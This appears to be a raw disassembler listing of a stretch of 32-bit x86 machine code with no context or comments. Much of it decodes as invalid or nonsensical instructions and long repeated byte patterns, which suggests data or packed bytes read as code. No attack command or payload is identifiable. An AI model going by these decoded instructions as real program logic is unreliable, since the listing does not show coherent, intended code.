  41a41d:	adc    eax,0xc7fa32f
  41a422:	(bad)  
  41a423:	adc    al,0x5b
  41a425:	cmp    al,0x7d
  41a427:	(bad)  
  41a428:	fimul  DWORD PTR [ebx-0x18930c88]
  41a42e:	add    BYTE PTR ss:[eax],al
	...
  41a455:	add    BYTE PTR [eax],al
  41a457:	add    BYTE PTR [edx+0x4],dl
  41a45a:	bound  ebp,QWORD PTR [ecx]
  41a45c:	adc    al,0xe0
  41a45e:	cld    
  41a45f:	mul    DWORD PTR [esi-0x2e35982a]
  41a465:	ins    BYTE PTR es:[edi],dx
  41a466:	add    BYTE PTR [ecx],bl
  41a468:	call   0xd7b0a274
  41a46d:	add    DWORD PTR [eax],eax
  41a46f:	sar    DWORD PTR [ebx-0x2816c11a],1
  41a475:	je     0x41a472
  41a477:	push   esi
  41a478:	xlat   BYTE PTR ds:[ebx]
  41a479:	cmp    al,0xd2
  41a47b:	arpl   WORD PTR [edx+0x1fa87657],bx
  41a481:	jecxz  0x41a487
  41a483:	sti    
  41a484:	(bad)  
  41a486:	cli    
  41a487:	shl    ebx,1
  41a489:	jnp    0x41a450
  41a48b:	shr    BYTE PTR fs:[ebp+edi*8+0x26],1
  41a490:	and    DWORD PTR [ebx+0x0],ebx
  41a493:	jmp    0x19c8abea
  41a498:	jmp    0x57511974
  41a49d:	outs   dx,BYTE PTR ds:[esi]
  41a49e:	das    
  41a49f:	sbb    edi,DWORD PTR [ebx+0x2b]
  41a4a2:	mov    DWORD PTR [esp+ebp*8+0x6c],esp
  41a4a6:	std    
  41a4a7:	test   al,0xd7
  41a4aa:	jl     0x41a49b
  41a4ac:	push   esi
  41a4ad:	outs   dx,BYTE PTR ds:[esi]
  41a4ae:	std    
  41a4af:	ins    BYTE PTR es:[edi],dx
  41a4b0:	jmp    0x41a51e
  41a4b2:	std    
  41a4b3:	fidiv  WORD PTR [edx+0x56d77cdf]
  41a4b9:	outs   dx,BYTE PTR ds:[esi]
  41a4ba:	or     eax,0x8f
	...
  41a4e3:	add    BYTE PTR [eax],al
  41a4e5:	sbb    bl,dl
  41a4e7:	loopne 0x41a52f
  41a4e9:	fwait
  41a4ea:	mov    al,0x7c
  41a4ec:	mov    edi,0x7f0d6de6
  41a4f1:	push   ss
  41a4f2:	cmp    al,0xf8
  41a4f4:	popa   
  41a4f5:	sbb    BYTE PTR [ebp+0x1962e901],dl
  41a4fb:	and    DWORD PTR [ebx+0x6902f107],0xa7735b1a
  41a505:	sub    eax,0x2500e805
  41a50a:	mov    eax,ds:0xbb46fffb
  41a50f:	js     0x41a50f
  41a511:	push   edx
  41a512:	mov    eax,ds:0x578e8000
  41a517:	jno    0x41a4c0
  41a519:	inc    esi
  41a51a:	jecxz  0x41a594
  41a51c:	(bad)  
  41a51d:	push   edx
  41a51e:	mov    eax,ds:0xf3337500
  41a523:	add    BYTE PTR [eax+0x50fba153],0xed
  41a52a:	mov    eax,ds:0x4152fff9
  41a52f:	pop    esi
  41a530:	pop    ebx
  41a531:	cld    
  41a532:	sbb    DWORD PTR [ecx-0x3e],0x7d
  41a536:	push   edi
  41a537:	push   ecx
  41a538:	mov    DWORD PTR [eax],ebp
  41a53a:	sub    BYTE PTR [eax+0x53],dl
  41a53d:	stos   DWORD PTR es:[edi],eax
  41a53e:	in     al,dx
  41a53f:	push   eax
  41a540:	or     dh,bh
  41a542:	inc    edx
  41a543:	or     al,0x8b
  41a545:	mov    BYTE PTR [edi+0x2e],ah
  41a548:	leave  
	...
  41a571:	add    bh,cl
  41a573:	imul   ecx,DWORD PTR [esi],0xffffff88
  41a576:	jns    0x41a5ea
  41a578:	cmc    
  41a579:	mov    bh,BYTE PTR [ecx]
  41a57b:	test   WORD PTR [esp+ebp*2],ax
  41a57f:	push   ss
  41a580:	jg     0x41a57b
  41a582:	sub    eax,0xf753e913
  41a587:	mov    gs,WORD PTR [edx+edi*8-0x2dd25eae]
  41a58e:	shl    BYTE PTR [edx+0x17],0x8a
  41a592:	or     DWORD PTR [ecx+0x32],edx
  41a595:	add    DWORD PTR [ebp-0x307cbda2],ecx
  41a59b:	addr16 jns 0x41a58e
  41a59e:	add    al,0xb1
  41a5a0:	mov    al,BYTE PTR [eax+edi*8-0x6a]
  41a5a4:	mov    BYTE PTR [edi+edx*8],al
  41a5a7:	and    BYTE PTR [edi-0x6],bh
  41a5aa:	sbb    al,0x7c
  41a5ac:	inc    ebp
  41a5ad:	icebp  
  41a5ae:	inc    edx
  41a5af:	sub    eax,0xb679ec79
  41a5b4:	clc    
  41a5b5:	call   ebx
  41a5b7:	je     0x41a5ba
  41a5b9:	add    BYTE PTR [esp+esi*2],bl
  41a5bc:	add    DWORD PTR [eax],eax
  41a5be:	sbb    al,0x74
  41a5c0:	add    DWORD PTR [eax],eax
  41a5c2:	sbb    al,0x74
  41a5c4:	add    DWORD PTR [eax],eax
  41a5c6:	sbb    al,0x74
  41a5c8:	add    DWORD PTR [eax],eax
  41a5ca:	sbb    al,0x74
  41a5cc:	add    DWORD PTR [eax],eax
  41a5ce:	sbb    al,0x74
  41a5d0:	add    DWORD PTR [eax],eax
  41a5d2:	sbb    al,0x74
  41a5d4:	add    DWORD PTR [eax],eax
	...
  41a5fe:	add    BYTE PTR [esp+esi*2],bl
  41a601:	add    DWORD PTR [eax],eax
  41a603:	sbb    al,0x74
  41a605:	add    DWORD PTR [eax],eax
  41a607:	sbb    al,0x74
  41a609:	add    DWORD PTR [eax],eax
  41a60b:	sbb    al,0x74
  41a60d:	add    DWORD PTR [eax],eax
  41a60f:	sbb    al,0x74
  41a611:	add    DWORD PTR [eax],eax
  41a613:	sbb    al,0x74
  41a615:	add    DWORD PTR [eax],eax
  41a617:	sbb    al,0x74
  41a619:	add    DWORD PTR [eax],eax
  41a61b:	sbb    al,0x74
  41a61d:	add    DWORD PTR [eax],eax
  41a61f:	sbb    al,0x74
  41a621:	add    DWORD PTR [eax],eax
  41a623:	sbb    al,0x74
  41a625:	add    DWORD PTR [eax],eax
  41a627:	sbb    al,0x74
  41a629:	add    DWORD PTR [eax],eax
  41a62b:	sbb    al,0x74
  41a62d:	add    DWORD PTR [eax],eax
  41a62f:	sbb    al,0x74
  41a631:	add    DWORD PTR [eax],eax
  41a633:	sbb    al,0x74
  41a635:	add    DWORD PTR [eax],eax
  41a637:	sbb    al,0x74
  41a639:	add    DWORD PTR [eax],eax
  41a63b:	sbb    al,0x74
  41a63d:	add    DWORD PTR [eax],eax
  41a63f:	sbb    al,0x74
  41a641:	add    DWORD PTR [eax],eax
  41a643:	sbb    al,0x74
  41a645:	add    DWORD PTR [eax],eax
  41a647:	sbb    al,0x74
  41a649:	add    DWORD PTR [eax],eax
  41a64b:	sbb    al,0x5b
  41a64d:	out    0x3,eax
  41a64f:	sbb    al,0x5b
  41a651:	out    0x3,eax
  41a653:	sbb    al,0x5b
  41a655:	out    0x3,eax
  41a657:	sbb    al,0x5b
  41a659:	out    0x3,eax
  41a65b:	sbb    al,0x5b
  41a65d:	out    0x3,eax
  41a65f:	sbb    al,0x5b
  41a661:	out    0x3,eax
	...
  41a68b:	add    BYTE PTR [ebx+ebx*2],bl
  41a68e:	out    0x3,eax
  41a690:	sbb    al,0x5b
  41a692:	out    0x3,eax
  41a694:	sbb    al,0x5b
  41a696:	out    0x3,eax
  41a698:	sbb    al,0x5b
  41a69a:	out    0x3,eax
  41a69c:	sbb    al,0x5b
  41a69e:	out    0x3,eax
  41a6a0:	sbb    al,0x5b
  41a6a2:	out    0x3,eax
  41a6a4:	sbb    al,0x5b
  41a6a6:	out    0x3,eax
  41a6a8:	sbb    al,0x5b
  41a6aa:	out    0x3,eax
  41a6ac:	sbb    al,0x5b
  41a6ae:	out    0x3,eax
  41a6b0:	sbb    al,0x5b
  41a6b2:	out    0x3,eax
  41a6b4:	sbb    al,0x5b
  41a6b6:	out    0x3,eax
  41a6b8:	sbb    al,0x5b
  41a6ba:	out    0x3,eax
  41a6bc:	sbb    al,0x5b
  41a6be:	in     al,0xfd
  41a6c0:	push   ss
  41a6c1:	push   ebp
  41a6c2:	mov    BYTE PTR [ebx],dh
  41a6c4:	call   0xca652fbc
  41a6c9:	sub    ecx,ebp
  41a6cb:	adc    edi,ebx
  41a6cd:	cmp    al,bh
  41a6cf:	push   ss
  41a6d0:	cld    
  41a6d1:	cmp    dh,BYTE PTR [ebx+0x5b]
  41a6d4:	mov    edi,0xd3595a3a
  41a6d9:	test   BYTE PTR [edx+0x61],0xae
  41a6dd:	cmp    bl,BYTE PTR [ebx+0x5c]
  41a6e0:	mov    edi,0x9061493a
  41a6e5:	out    dx,eax
  41a6e6:	dec    ebx
  41a6e7:	push   edx
  41a6e8:	cmp    al,0x25
  41a6ea:	adc    cl,bh
  41a6ec:	adc    eax,0x46001c
	...
  41a719:	push   0x5b4071f0
  41a71e:	repz jae 0x41a6ea
  41a721:	pop    ss
  41a722:	cli    
  41a723:	es leave 
  41a725:	adc    BYTE PTR [eax],dh
  41a727:	aaa    
  41a728:	rol    DWORD PTR [ebp*1+0x3b28d930],1
  41a72f:	bound  eax,QWORD PTR [eax]
  41a731:	clc    
  41a732:	adc    al,0x6d
  41a734:	add    al,0x6e
  41a736:	(bad)  
  41a737:	bound  eax,QWORD PTR [edi]
  41a739:	clc    
  41a73a:	pop    ds
  41a73b:	(bad)  
  41a73c:	cli    
  41a73d:	cmp    al,0xf9
  41a73f:	sub    ecx,DWORD PTR [ecx]
  41a741:	pop    ecx
  41a742:	imul   DWORD PTR [ebx+0x9]
  41a745:	out    dx,al
  41a746:	jmp    DWORD PTR [ecx+eax*8+0x53]
  41a74a:	jmp    0xbb62:0xe9fcbb1f
  41a751:	loope  0x41a74e
  41a753:	arpl   WORD PTR [edi],cx
  41a755:	test   DWORD PTR [edx+0xb],edx
  41a758:	jecxz  0x41a79e
  41a75a:	div    BYTE PTR [ecx-0x3c]
  41a75d:	aas    
  41a75e:	add    BYTE PTR [esi-0x71],ch
  41a761:	retf   0x6aec
  41a764:	mov    bl,bl
  41a766:	jmp    FWORD PTR [edi+eax*4+0x15]
  41a76a:	cmp    ebp,DWORD PTR [eax-0x6b]
  41a76d:	jmp    0x41a759
  41a76f:	cmp    esi,edx
  41a771:	sub    ch,dh
  41a773:	je     0x41a7eb
  41a775:	xor    DWORD PTR [eax],eax
  41a777:	bound  edi,QWORD PTR [edx-0x44]
  41a77a:	clc    
  41a77b:	jo     0x41a7fb
	...
  41a7a5:	add    cl,bl
  41a7a7:	out    dx,al
  41a7a8:	je     0x41a7f2
  41a7aa:	into   
  41a7ab:	sti    
  41a7ac:	sub    eax,0x2cf3d34a
  41a7b1:	in     al,0x25
  41a7b3:	push   ebp
  41a7b4:	or     ch,cl
  41a7b6:	pop    ds
  41a7b7:	pop    ebx
  41a7b8:	add    BYTE PTR [eax],al
  41a7ba:	add    eax,0xf500005c
  41a7bf:	pop    ebx
  41a7c0:	add    BYTE PTR [eax],al
  41a7c2:	cmc    
  41a7c3:	pop    ebx
  41a7c4:	add    BYTE PTR [eax],al
  41a7c6:	add    eax,0x500005c
  41a7cb:	pop    esp
  41a7cc:	add    BYTE PTR [eax],al
  41a7ce:	cmc    
  41a7cf:	pop    ebx
  41a7d0:	add    BYTE PTR [eax],al
  41a7d2:	cmc    
  41a7d3:	pop    ebx
  41a7d4:	add    BYTE PTR [eax],al
  41a7d6:	lds    ebx,FWORD PTR [ebx+0x0]
  41a7d9:	add    ch,al
  41a7db:	pop    ebx
  41a7dc:	add    BYTE PTR [eax],al
  41a7de:	mov    ch,0x5b
  41a7e0:	add    BYTE PTR [eax],al
  41a7e2:	mov    ch,0x5b
  41a7e4:	add    BYTE PTR [eax],al
  41a7e6:	lds    ebx,FWORD PTR [ebx+0x0]
  41a7e9:	add    ch,al
  41a7eb:	pop    ebx
  41a7ec:	add    BYTE PTR [eax],al
  41a7ee:	mov    ch,0x5b
  41a7f0:	add    BYTE PTR [eax],al
  41a7f2:	mov    al,bl
  41a7f4:	dec    esi
  41a7f5:	imul   eax,DWORD PTR [ebx+edi*1+0x29],0x4
  41a7fa:	push   ebx
  41a7fb:	mov    dh,0x54
  41a7fd:	in     al,dx
  41a7fe:	sub    BYTE PTR [edx-0x25a5d29e],bh
  41a804:	pop    es
  41a805:	push   edi
  41a806:	js     0x41a869
  41a808:	add    eax,0x11
	...
  41a831:	add    BYTE PTR [eax],al
  41a833:	shl    DWORD PTR [eax+0x65],0xe4
  41a837:	lods   eax,DWORD PTR ds:[esi]
  41a838:	adc    DWORD PTR [edi-0x72],ecx
  41a83b:	jne    0x41a898
  41a83d:	add    BYTE PTR [eax],al
  41a83f:	inc    ebp
  41a840:	pop    ebx
  41a841:	add    BYTE PTR [eax],al
  41a843:	inc    ebp
  41a844:	pop    ebx
  41a845:	add    BYTE PTR [eax],al
  41a847:	xor    eax,0x3500005b
  41a84c:	pop    ebx
  41a84d:	add    BYTE PTR [eax],al
  41a84f:	inc    ebp
  41a850:	pop    ebx
  41a851:	add    BYTE PTR [eax],al
  41a853:	inc    ebp
  41a854:	pop    ebx
  41a855:	add    BYTE PTR [eax],al
  41a857:	xor    eax,0x1c00005b
  41a85c:	jb     0x41a85f
  41a85e:	add    BYTE PTR [esp+esi*2],bl
  41a861:	add    DWORD PTR [eax],eax
  41a863:	sbb    al,0x74
  41a865:	add    DWORD PTR [eax],eax
  41a867:	sbb    al,0x74
  41a869:	add    DWORD PTR [eax],eax
  41a86b:	sbb    al,0x74
  41a86d:	add    DWORD PTR [eax],eax
  41a86f:	sbb    al,0x74
  41a871:	add    DWORD PTR [eax],eax
  41a873:	sbb    al,0x74
  41a875:	add    DWORD PTR [eax],eax
  41a877:	sbb    al,0x74
  41a879:	add    DWORD PTR [eax],eax
  41a87b:	sbb    al,0x74
  41a87d:	add    DWORD PTR [eax],eax
  41a87f:	sbb    al,0x74
  41a881:	add    DWORD PTR [eax],eax
  41a883:	sbb    al,0x74
  41a885:	add    DWORD PTR [eax],eax
  41a887:	sbb    al,0x74
  41a889:	add    DWORD PTR [eax],eax
  41a88b:	sbb    al,0x74
  41a88d:	add    DWORD PTR [eax],eax
  41a88f:	sbb    al,0x74
  41a891:	add    DWORD PTR [eax],eax
  41a893:	sbb    al,0x74
  41a895:	add    DWORD PTR [eax],eax
	...
  41a8bf:	add    BYTE PTR [esp+esi*2],bl
  41a8c2:	add    DWORD PTR [eax],eax
  41a8c4:	sbb    al,0x74
  41a8c6:	add    DWORD PTR [eax],eax
  41a8c8:	sbb    al,0x74
  41a8ca:	add    DWORD PTR [eax],eax
  41a8cc:	sbb    al,0x74
  41a8ce:	add    DWORD PTR [eax],eax
  41a8d0:	sbb    al,0x74
  41a8d2:	add    DWORD PTR [eax],eax
  41a8d4:	sbb    al,0x74
  41a8d6:	add    DWORD PTR [eax],eax
  41a8d8:	sbb    al,0x74
  41a8da:	add    DWORD PTR [eax],eax
  41a8dc:	sbb    al,0x74
  41a8de:	add    DWORD PTR [eax],eax
  41a8e0:	sbb    al,0x74
  41a8e2:	add    DWORD PTR [eax],eax
  41a8e4:	sbb    al,0x74
  41a8e6:	add    DWORD PTR [eax],eax
  41a8e8:	sbb    al,0x74
  41a8ea:	add    DWORD PTR [eax],eax
  41a8ec:	sbb    al,0x74
  41a8ee:	add    DWORD PTR [eax],eax
  41a8f0:	sbb    al,0x74
  41a8f2:	add    DWORD PTR [eax],eax
  41a8f4:	sbb    al,0x74
  41a8f6:	add    DWORD PTR [eax],eax
  41a8f8:	sbb    al,0x74
  41a8fa:	add    DWORD PTR [eax],eax
  41a8fc:	sbb    al,0x5b
  41a8fe:	out    0x3,eax
  41a900:	sbb    al,0x5b
  41a902:	out    0x3,eax
  41a904:	sbb    al,0x5b
  41a906:	out    0x3,eax
  41a908:	sbb    al,0x5b
  41a90a:	out    0x3,eax
  41a90c:	sbb    al,0x5b
  41a90e:	out    0x3,eax
  41a910:	sbb    al,0x5b
  41a912:	out    0x3,eax
  41a914:	sbb    al,0x5b
  41a916:	out    0x3,eax
  41a918:	sbb    al,0x5b
  41a91a:	out    0x3,eax
  41a91c:	sbb    al,0x5b
  41a91e:	out    0x3,eax
  41a920:	sbb    al,0x5b
  41a922:	out    0x3,eax
	...
  41a94c:	add    BYTE PTR [ebx+ebx*2],bl
  41a94f:	out    0x3,eax
  41a951:	sbb    al,0x5b
  41a953:	out    0x3,eax
  41a955:	sbb    al,0x5b
  41a957:	out    0x3,eax
  41a959:	sbb    al,0x5b
  41a95b:	out    0x3,eax
  41a95d:	sbb    al,0x5b
  41a95f:	out    0x3,eax
  41a961:	sbb    al,0x5b
  41a963:	out    0x3,eax
  41a965:	sbb    al,0x5b
  41a967:	out    0x3,eax
  41a969:	sbb    al,0x5b
  41a96b:	out    0x3,eax
  41a96d:	sbb    al,0x5b
  41a96f:	out    0x3,eax
  41a971:	sbb    al,0x5b
  41a973:	out    0x3,eax
  41a975:	sbb    al,0x5b
  41a977:	out    0x3,eax
  41a979:	sbb    al,0x5b
  41a97b:	out    0x3,eax
  41a97d:	sbb    al,0x5b
  41a97f:	out    0x3,eax
  41a981:	sbb    al,0x5b
  41a983:	out    0x3,eax
  41a985:	sbb    al,0x5b
  41a987:	out    0x3,eax
  41a989:	sbb    al,0x5b
  41a98b:	out    0x3,eax
  41a98d:	sbb    al,0x5b
  41a98f:	fcom   DWORD PTR [ecx]
  41a991:	or     eax,0x1c0dd42f
  41a996:	jmp    0x41a91f
  41a998:	push   eax
  41a999:	int    0xed
  41a99b:	lea    edx,[ecx-0x48]
  41a99e:	pop    edx
  41a99f:	add    BYTE PTR [ecx-0x29],bh
  41a9a2:	jmp    0x4c74:0xf61f8b61
  41a9a9:	repnz out dx,al
  41a9ab:	jbe    0x41a996
  41a9ad:	sub    BYTE PTR [ebx],ch
  41a9af:	xor    DWORD PTR ds:0x0,ebx
	...
  41a9d9:	add    BYTE PTR ds:0x4b446765,dl
  41a9df:	call   0x2b529354
  41a9e4:	xor    ebp,esi
  41a9e6:	add    al,0x2f
  41a9e8:	xor    eax,0x32341ff1
  41a9ed:	cli    
  41a9ee:	jmp    0x41aa54
  41a9f0:	pusha  
  41a9f1:	or     eax,DWORD PTR [ebx+0x34]
  41a9f4:	xor    bl,dl
  41a9f6:	pop    ds
  41a9f7:	mul    DWORD PTR [edx+0x1d]
  41a9fa:	or     eax,0x1fff66f8
  41a9ff:	out    dx,eax
  41aa00:	(bad)  
  41aa01:	cli    
  41aa02:	adc    ebx,DWORD PTR [ebx+0x6c]
  41aa05:	push   cs
  41aa06:	push   es
  41aa07:	clc    
  41aa08:	push   DWORD PTR [edi-0x6ffd44f]
  41aa0e:	clc    
  41aa0f:	jmp    0xe9308884
  41aa14:	arpl   WORD PTR [eax],bx
  41aa16:	sbb    bl,dh
  41aa18:	(bad)  
  41aa19:	lds    ecx,FWORD PTR [ebx-0xa]
  41aa1c:	(bad)  
  41aa1d:	mov    ebx,0xcc68f54e
  41aa22:	dec    eax
  41aa23:	pop    ebx
  41aa24:	fs mov ebx,0xc76cfe38
  41aa2a:	pop    ds
  41aa2b:	out    dx,eax
  41aa2c:	jno    0x41a9e2
  41aa2e:	sub    ch,bh
  41aa30:	ins    DWORD PTR es:[edi],dx
  41aa31:	xchg   esi,eax
  41aa32:	jo     0x41aa98
  41aa34:	xor    al,bl
  41aa36:	push   0x1fd82f35
  41aa3b:	cld    
  41aa3c:	imul   edi,DWORD PTR [esi+0x0],0x0
	...
  41aa64:	add    BYTE PTR [eax],al
  41aa66:	add    BYTE PTR ds:0xb20076f8,dl
  41aa6c:	and    eax,DWORD PTR [eax]
  41aa6e:	xor    DWORD PTR [edi+0x7b35316d],eax
  41aa74:	popa   
  41aa75:	std    
  41aa76:	jb     0x41aa15
  41aa78:	aas    
  41aa79:	outs   dx,DWORD PTR fs:[esi]
  41aa7b:	retf   0x2d5e
  41aa7e:	xor    al,BYTE PTR [esi]
  41aa80:	arpl   WORD PTR [edx],si
  41aa82:	cmp    ah,BYTE PTR ss:[edi+0x36]
  41aa86:	add    BYTE PTR [esi+0x37],ah
  41aa89:	jb     0x41aaf4
  41aa8b:	inc    esi
  41aa8c:	and    eax,DWORD PTR [eax]
  41aa8e:	jae    0x41aad8
  41aa90:	sub    DWORD PTR [edi+0x68],ebp
  41aa93:	pop    esp
  41aa94:	sub    DWORD PTR [ecx+0x0],esp
  41aa97:	xor    BYTE PTR [esi],bh
  41aa99:	outs   dx,DWORD PTR ds:[esi]
  41aa9a:	je     0x41aab4
  41aa9c:	sub    eax,0x2a126300
  41aaa1:	jo     0x41ab18
  41aaa3:	cmp    DWORD PTR [edx],esi
  41aaa5:	jb     0x41aaa7
  41aaa7:	xor    eax,0x166e652d
  41aaac:	xor    ch,BYTE PTR [edi+0x73]
  41aaaf:	mov    ch,0x2b
  41aab1:	sub    dh,BYTE PTR gs:[bp+si]
  41aab5:	jb     0x41aab7
  41aab7:	sbb    ebp,DWORD PTR [eax]
  41aab9:	imul   esi,DWORD PTR [edi+edx*8+0x3e],0x6c
  41aabe:	ins    BYTE PTR es:[edi],dx
  41aabf:	mov    ch,0x3e
  41aac1:	outs   dx,BYTE PTR ds:[esi]
  41aac2:	addr16 push 0x586a0033
  41aac8:	sub    al,0x71
  41aaca:	jae    0x41aacc
	...
  41aaf4:	test   BYTE PTR [edi+0x2d],dl
  41aaf7:	xor    al,BYTE PTR [esi-0x7accd092]
  41aafd:	and    BYTE PTR [eax+0x61],ch
  41ab00:	test   eax,0x87657632
  41ab05:	push   edi
  41ab06:	data16 jb 0x41aaa1
  41ab09:	xor    ah,BYTE PTR [edi+ebp*2+0x1c]
  41ab0d:	fild   WORD PTR [ecx]
  41ab0f:	imul   eax,ebp,0xce632ce5
  41ab15:	jno    0x41ab3b
  41ab17:	jno    0x41aad1
  41ab19:	fild   DWORD PTR [ecx]
  41ab1b:	jno    0x41aae8
  41ab1d:	shl    BYTE PTR [esi],1
  41ab1f:	arpl   WORD PTR [esi-0x538cc98f],bp
  41ab25:	push   ss
  41ab26:	imul   edi,DWORD PTR ss:[ebp-0x7a94fbed],0x15
  41ab2e:	sub    al,0x5f
  41ab30:	jns    0x41ab52
  41ab32:	add    al,0x61
  41ab34:	je     0x41ab45
  41ab36:	and    eax,0x2a747971
  41ab3b:	outs   dx,BYTE PTR ds:[esi]
  41ab3c:	jo     0x41ab4d
  41ab3e:	outs   dx,BYTE PTR ss:[esi]
  41ab40:	jns    0x41ab6a
  41ab42:	add    al,0x6a
  41ab44:	jnp    0x41ab8b
  41ab46:	sub    al,0x73
  41ab48:	jge    0x41abbe
  41ab4a:	daa    
  41ab4b:	jae    0x41ab8c
  41ab4d:	pop    ebp
  41ab4e:	cmp    DWORD PTR [ebp+0x49],ebp
  41ab51:	je     0x41ab76
  41ab53:	ins    BYTE PTR es:[edi],dx
  41ab54:	inc    ecx
  41ab55:	gs xor al,0x63
	...
  41ab80:	add    BYTE PTR [eax],bh
  41ab82:	je     0x41aba7
  41ab84:	pop    edi
  41ab85:	das    
  41ab86:	dec    edi
  41ab87:	es pop edi
  41ab89:	inc    eax
  41ab8a:	pusha  
  41ab8b:	add    DWORD PTR [ecx+0x30],esi
  41ab8e:	xchg   ebx,eax
  41ab8f:	xor    esi,DWORD PTR [ebp+0x3d]
  41ab92:	xchg   BYTE PTR [eax+eax*1],dh
  41ab95:	dec    esp
  41ab96:	inc    esp
  41ab97:	hlt    
  41ab98:	das    
  41ab99:	dec    esp
  41ab9a:	inc    esp
  41ab9b:	add    al,0x70
  41ab9d:	adc    DWORD PTR [esi+0x73f96c31],esp
  41aba3:	sub    ebp,DWORD PTR [ebp-0x12]
  41aba6:	(bad)  
  41aba7:	and    ch,BYTE PTR [esi+0x1c]
  41abaa:	call   0x38f:0x5af06722
  41abb1:	in     eax,dx
  41abb2:	out    0x8b,eax
  41abb4:	cs mov edi,0xcd22e6ec
  41abba:	bnd jp 0x41abe3
  41abbd:	rcr    DWORD PTR [edx-0x77],cl
  41abc0:	ss int 0xe6
  41abc3:	xor    DWORD PTR ds:0x228bf31c,0xffffffaa
  41abca:	idiv   DWORD PTR [ebx+eax*1-0x54]
  41abce:	not    DWORD PTR [esi+0x34]
  41abd1:	mov    edi,0x50f8e6ec
  41abd6:	sub    bl,BYTE PTR [esi]
  41abd8:	stc    
  41abd9:	dec    eax
  41abda:	sub    ah,bh
  41abdc:	sub    ecx,DWORD PTR [edi-0x71d8c50f]
  41abe2:	pop    ebx
  41abe3:	dec    ebx
  41abe4:	xor    DWORD PTR [eax],eax
	...
  41ac0e:	jb     0x41ac08
  41ac10:	inc    edx
  41ac11:	cmp    ebx,DWORD PTR [esp+edi*8]
  41ac14:	cmp    al,0x28
  41ac16:	outs   dx,BYTE PTR ds:[esi]
  41ac17:	clc    
  41ac18:	sbb    eax,0xdf36804
  41ac1d:	das    
  41ac1e:	jnp    0x41ac0e
  41ac20:	out    0x22,al
  41ac22:	inc    edx
  41ac23:	cli    
  41ac24:	add    esi,DWORD PTR [eax]
  41ac26:	dec    ebp
  41ac27:	pop    ebx
  41ac28:	or     ch,BYTE PTR [ebx+eiz*2]
  41ac2b:	in     eax,dx
  41ac2c:	or     ch,BYTE PTR [ebx]
  41ac2e:	aas    
  41ac2f:	pop    ebx
  41ac30:	or     esp,DWORD PTR [ebx]
  41ac32:	inc    edx
  41ac33:	hlt    
  41ac34:	add    esi,DWORD PTR [eax]
  41ac36:	sbb    al,0x2c
  41ac38:	sbb    bl,dh
  41ac3a:	repnz pop edx
  41ac3c:	shl    DWORD PTR [esi],1
  41ac3e:	or     dh,cl
  41ac40:	mov    edi,0xe6ecff29
  41ac45:	xor    al,0x3
  41ac47:	icebp  
  41ac48:	int    0x2f
  41ac4a:	call   FWORD PTR [edx-0x31]
  41ac4d:	and    cl,BYTE PTR [edx]
  41ac4f:	icebp  
  41ac50:	inc    edi
  41ac52:	inc    edi
  41ac53:	pop    ebx
  41ac54:	outs   dx,DWORD PTR ds:[esi]
  41ac55:	enter  0xe829,0x70
  41ac59:	mov    eax,ds:0x995ef31f
  41ac5e:	pminsw mm7,mm7
  41ac61:	cmp    esi,0xffffffe6
  41ac64:	jno    0x41abe6
  41ac66:	pop    es
  41ac67:	pop    ebx
  41ac68:	jo     0x41abf2
  41ac6a:	or     ah,ch
  41ac6c:	inc    DWORD PTR [edi-0x77a0fe02]
	...
  41ac9a:	add    dh,bh
  41ac9c:	pop    edx
  41ac9d:	ss mov ah,0x33
  41aca0:	sub    dh,BYTE PTR [edx]
  41aca2:	sbb    BYTE PTR [eax],bl
  41aca4:	add    ch,BYTE PTR [ebx+0x48]
  41aca7:	dec    edx
  41aca8:	neg    DWORD PTR [esi-0x17]
  41acab:	inc    ecx
  41acac:	out    dx,al
  41acad:	jae    0x41acf0
  41acaf:	cmp    ecx,esi
  41acb1:	fs jmp 0x46afa4f1
  41acb7:	inc    ebp
  41acb8:	in     eax,dx
  41acb9:	inc    DWORD PTR [ebx+0x43]
  41acbc:	out    0x67,eax
  41acbe:	inc    esp
  41acbf:	cs pop ebx
  41acc1:	jno    0x41acda
  41acc3:	xor    ebp,esi
  41acc5:	outs   dx,DWORD PTR ds:[esi]
  41acc6:	and    BYTE PTR [eax],ah
  41acc8:	cmc    
  41acc9:	bound  ebx,QWORD PTR [edx]
  41accb:	psubb  mm4,QWORD PTR [eax+0x8]
  41accf:	and    dh,ah
  41acd1:	bound  edx,QWORD PTR ds:0x46aedff
  41acd7:	and    bl,ch
  41acd9:	ins    BYTE PTR es:[edi],dx
  41acda:	add    al,BYTE PTR ds:0x1fff6cf4
  41ace0:	clc    
  41ace1:	imul   edx,esi,0xffffffe9
  41ace4:	sti    
  41ace5:	jbe    0x41acb5
  41ace7:	push   esp
  41ace8:	xor    BYTE PTR [eax],al
  41acea:	sbb    BYTE PTR [ecx+0x20182f31],cl
  41acf0:	hlt    
  41acf1:	jb     0x41acf3
  41acf3:	(bad)  
  41acf4:	sub    BYTE PTR [ebp+0x6e],bl
  41acf7:	bound  ebx,QWORD PTR [eax+ebp*2+0x65]
  41acfb:	pop    ecx
  41acfc:	sub    al,0x69
  41acfe:	add    BYTE PTR gs:[eax],al
	...
  41ad25:	add    BYTE PTR [eax],al
  41ad27:	add    BYTE PTR [ebp+0x32],dh
  41ad2a:	jno    0x41ad9f
  41ad2c:	sub    DWORD PTR [edi],0x37af006e
  41ad32:	outs   dx,DWORD PTR ds:[esi]
  41ad33:	ins    DWORD PTR es:[edi],dx
  41ad34:	pushf  
  41ad35:	cs popa 
  41ad37:	add    dl,cl
  41ad39:	sub    DWORD PTR [ebp+0x6e],ebx
  41ad3c:	xchg   edx,eax
  41ad3d:	xor    eax,DWORD PTR [eax]
  41ad3f:	je     0x41ace1
  41ad41:	sub    eax,0x399b6974
  41ad46:	add    BYTE PTR [ecx-0x5b],ah
  41ad49:	sub    ebp,DWORD PTR [ebp+eiz*2+0x35]
  41ad4d:	sub    esp,DWORD PTR [ebp+0x63]
  41ad50:	ins    DWORD PTR es:[edi],dx
  41ad51:	xor    ch,BYTE PTR [esp+ebp*2+0x60]
  41ad55:	push   edi
  41ad56:	jo     0x41adbd
  41ad58:	push   esp
  41ad59:	cmp    al,0x61
  41ad5b:	add    BYTE PTR [esi+0x32],al
  41ad5e:	pop    edi
  41ad5f:	jb     0x41adc1
  41ad61:	and    eax,DWORD PTR [eax]
  41ad63:	xor    DWORD PTR ds:0x56617239,eax
  41ad69:	xor    al,BYTE PTR [eax]
  41ad6b:	ja     0x41ad79
  41ad6d:	sub    ebp,DWORD PTR [ecx+ebp*2+0x24]
  41ad71:	sub    al,BYTE PTR [eax]
  41ad73:	imul   ebx,DWORD PTR [ecx],0x2c657630
  41ad79:	xor    BYTE PTR [ecx+0x32],dh
